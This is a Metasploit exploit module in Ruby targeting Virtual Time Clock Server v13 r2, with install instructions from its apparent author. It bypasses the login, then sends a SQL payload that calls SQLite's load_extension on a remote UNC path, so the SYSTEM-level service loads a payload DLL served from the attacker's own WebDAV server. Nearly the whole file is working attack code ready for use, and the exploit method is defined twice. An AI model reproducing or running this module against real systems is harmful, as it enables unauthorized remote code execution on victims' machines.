#[Author] Ben 'highjack' Sheppard
#[Title] Virtual Time Clock Server v13 r2 <= Remote DLL Injection
#[Twitter] @highjack_
#[Author URL] http://www.bensheppard.net/2014/05/virtual-time-clock-server-v13-r2-remote.html
#[Vendor Url] http://www.redcort.com
#[Install] cp virtualtimeclock.rb into /root/.msf4/modules/exploits/windows/misc
#msfconsole must then be launched as root as this exploit binds to low ports
#[Thanks] to juan vazquez, I used his IBM System Director module as a base :)

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

    include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::EXE
	include Msf::Exploit::Remote::Tcp

      def initialize
           super(
               'Name'          => 'Virtual Time Clock Remote DLL Injection',
				'Description'   => %q{
					The application listen on a remote port of 56777 by default, it allows users to authenticate
					themselves update the internal sqlite database with hours they have worked. However two issues have been identified,
					1) The login can be bypassed as it does not implement any kind of state
					2) Arbitary sql can be run using sqlite, the version of sqlite this application uses has been compiled with load_extensions
					   support so we can load arbitary commands. The service is also running as system :)
			},
               'Author'        => 'Ben "highjack" Sheppard',
               'Targets'       => [ ['Virtual Timeclock Server', {} ] ],
               'DefaultTarget'  => 0,
               'Platform'      => 'win',
           )
           register_options( [
               Opt::RPORT(56777),
               OptString.new('URIPATH',   [ true, "The URI to use (do not change)", "/" ]),
			   OptPort.new('SRVPORT',     [ true, "The daemon port to listen on (do not change)", 80 ])
           ], self.class)
      end

     
      def exploit
           connect()
           sock.put(payload.encoded)
           handler()
           disconnect()
      end
      
      
      def auto_target(cli, request)
		agent = request.headers['User-Agent']

		ret = nil
		# Check for MSIE and/or WebDAV redirector requests
		if agent =~ /(Windows NT 5\.1|MiniRedir\/5\.1)/
			ret = targets[0]
		elsif agent =~ /(Windows NT 5\.2|MiniRedir\/5\.2)/
			ret = targets[0]
		else
			print_error("Unknown User-Agent: #{agent}")
		end

		ret
	end


	def on_request_uri(cli, request)

		mytarget = target
		if target.name == 'Automatic'
			mytarget = auto_target(cli, request)
			if (not mytarget)
				send_not_found(cli)
				return
			end
		end

		# If there is no subdirectory in the request, we need to redirect.
		if (request.uri == '/') or not (request.uri =~ /\/[^\/]+\//)
			if (request.uri == '/')
				subdir = '/' + rand_text_alphanumeric(8+rand(8)) + '/'
			else
				subdir = request.uri + '/'
			end
			print_status("Request for \"#{request.uri}\" does not contain a sub-directory, redirecting to #{subdir} ...")
			send_redirect(cli, subdir)
			return
		end

		# dispatch WebDAV requests based on method first
		case request.method
			when 'OPTIONS'
				process_options(cli, request, mytarget)

			when 'PROPFIND'
				process_propfind(cli, request, mytarget)

			when 'GET'
				process_get(cli, request, mytarget)

			when 'PUT'
				print_status("Sending 404 for PUT #{request.uri} ...")
				send_not_found(cli)

			else
				print_error("Unexpected request method encountered: #{request.method}")

		end

	end


	#
	# GET requests
	#
	def process_get(cli, request, target)

		print_status("Responding to GET request #{request.uri}")
		# dispatch based on extension
		if (request.uri =~ /\.dll$/i)
			print_status("Sending DLL")
			return if ((p = regenerate_payload(cli)) == nil)
			dll_payload = generate_payload_dll
			send_response(cli, dll_payload, { 'Content-Type' => 'application/octet-stream' })
		else
			send_not_found(cli)
		end
	end


	#
	# OPTIONS requests sent by the WebDav Mini-Redirector
	#
	def process_options(cli, request, target)
		print_status("Responding to WebDAV OPTIONS request")
		headers = {
			#'DASL'   => '<DAV:sql>',
			#'DAV'    => '1, 2',
			'Allow'  => 'OPTIONS, GET, PROPFIND',
			'Public' => 'OPTIONS, GET, PROPFIND'
		}
		send_response(cli, '', headers)
	end


	#
	# PROPFIND requests sent by the WebDav Mini-Redirector
	#
	def process_propfind(cli, request, target)
		path = request.uri
		print_status("Received WebDAV PROPFIND request")
		body = ''

		if (path =~ /\.dll$/i)
			print_status("Sending DLL multistatus for #{path} ...")
			body = %Q|<?xml version="1.0"?>
<a:multistatus xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/" xmlns:c="xml:" xmlns:a="DAV:">
<a:response>
</a:response>
</a:multistatus>
|
		elsif (path =~ /\.manifest$/i) or (path =~ /\.config$/i) or (path =~ /\.exe/i) or (path =~ /\.dll/i)
			print_status("Sending 404 for #{path} ...")
			send_not_found(cli)
			return

		elsif (path =~ /\/$/) or (not path.sub('/', '').index('/'))
			# Response for anything else (generally just /)
			print_status("Sending directory multistatus for #{path} ...")
			body = %Q|<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype><D:collection/></lp1:resourcetype>
<lp1:creationdate>2010-02-26T17:07:12Z</lp1:creationdate>
<lp1:getlastmodified>Fri, 26 Feb 2010 17:07:12 GMT</lp1:getlastmodified>
<lp1:getetag>"39e0001-1000-4808c3ec95000"</lp1:getetag>
<D:lockdiscovery/>
<D:getcontenttype>httpd/unix-directory</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>
|

		else
			print_status("Sending 404 for #{path} ...")
			send_not_found(cli)
			return

		end

		# send the response
		resp = create_response(207, "Multi-Status")
		resp.body = body
		resp['Content-Type'] = 'text/xml'
		cli.send_response(resp)
	end
      
      def exploit

		if datastore['SRVPORT'].to_i != 80 || datastore['URIPATH'] != '/'
			fail_with(Exploit::Failure::Unknown, 'Using WebDAV requires SRVPORT=80 and URIPATH=/')
		end

		super

	end

	def primer

		basename = rand_text_alpha(3)
		share_name = rand_text_alpha(3)
		myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']
		exploit_unc  = "\\\\#{myhost}\\"

		vprint_status("Payload available at #{exploit_unc}#{share_name}\\#{basename}.dll")

		@peer = "#{rhost}:#{rport}"

		print_status("#{@peer} - Injecting DLL...")
		payload="<P><I>highjack</I><C>dbSELECTRECS</C><D>SELECT 1,load_extension('#{exploit_unc}#{share_name}\\#{basename}.dll');</D></P>"
		connect()
		sendsploit=sock.put(payload)
		sleep(10)
		handler()
		disconnect()

		if sendsploit
			print_status"#{@peer} - Then injection seemed to work..."
		else
			fail_with(Exploit::Failure::Unknown, "#{@peer} - Unexpected response")
		end
	end

      def check

		peer = "#{rhost}:#{rport}"
		print_status("#{peer} - Checking if service is listenning")
		payload="<P><I>highjack</I><C>gtServerInfo</C></P>"
		connect()
		sock.put(payload)
		response = sock.get_once()
		disconnect()
		if response =~ /Virtual TimeClock Service '13/
			return CheckCode::Appears
		else
			return CheckCode::Safe
		end
	end
end

